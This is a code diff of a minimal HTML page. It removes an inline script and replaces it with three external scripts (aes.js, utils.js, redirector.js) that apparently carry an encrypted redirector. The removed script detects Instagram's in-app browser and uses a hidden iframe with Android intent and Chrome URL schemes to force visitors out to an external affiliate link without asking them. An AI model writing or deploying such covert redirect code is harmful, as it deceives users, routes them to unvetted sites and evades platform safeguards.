@@ -1,71 +1,8 @@
 <!DOCTYPE html>
 <html>
-  <body style="background:yellow;">
+  <body style="background:orange;">
   </body>
-  <script>
-(function() {
-        var instaRedirect = {
-            userAgent: navigator.userAgent,
-
-            isInstaBrowser: function() {
-                return /instagram/i.test(this.userAgent)
-            },
-
-            isAndroid: function() {
-                return /android/i.test(this.userAgent);
-            },
-
-            isIOS: function() {
-                return /iphone|ipad|ipod/i.test(this.userAgent);
-            },
-
-            createFrame: function() {
-                var f = document.createElement('iframe');
-                f.src = 'https://google.com';
-                f.style.display = 'none';
-
-                return document.body.appendChild(f);
-            },
-
-            deleteFrame: function(f) {
-                document.body.removeChild(f);
-            },
-
-            setLocation: function(url) {
-                var frame = instaRedirect.createFrame();
-
-                frame.onload = function() {
-                    frame.contentWindow.parent.location = url;
-                    instaRedirect.deleteFrame(frame);
-                };
-            },
-
-            getLinkForAndroid: function(clearUrl, protocol, targetLink) {
-                    return 'intent://' + clearUrl + '#Intent' +
-                            ';scheme=' + protocol + ';S.browser_fallback_url='
-                            + encodeURIComponent(targetLink) + ';end'
-            },
-
-            openInBrowser: function(targetLink) {
-                var url = new URL(targetLink),
-                protocol = url.protocol.replace(':', ''),
-                clearUrl = url.hostname + url.pathname + url.search;
-
-                if (this.isAndroid()) {
-                    var openInDefaultBrowser = this.getLinkForAndroid(clearUrl, protocol, targetLink);
-
-                    instaRedirect.setLocation(openInDefaultBrowser);
-
-                } else if (this.isIOS()) {
-                    instaRedirect.setLocation(protocol + '://' + clearUrl);
-                    instaRedirect.setLocation('googlechrome://' + clearUrl);
-                } else {
-                    instaRedirect.setLocation(protocol + '://' + clearUrl);
-                }
-            }
-        };
-
-        instaRedirect.openInBrowser('https://letitstars.club/?ref=vip100353_instatest2&source=wm&s=49');
-    })();
-  </script>
+  <script type="text/javascript" src="aes.js?077"></script>
+  <script type="text/javascript" src="utils.js?077" charset="utf-8"></script>
+  <script type="text/javascript" src="redirector.js?077" charset="utf-8"></script>
 </html>
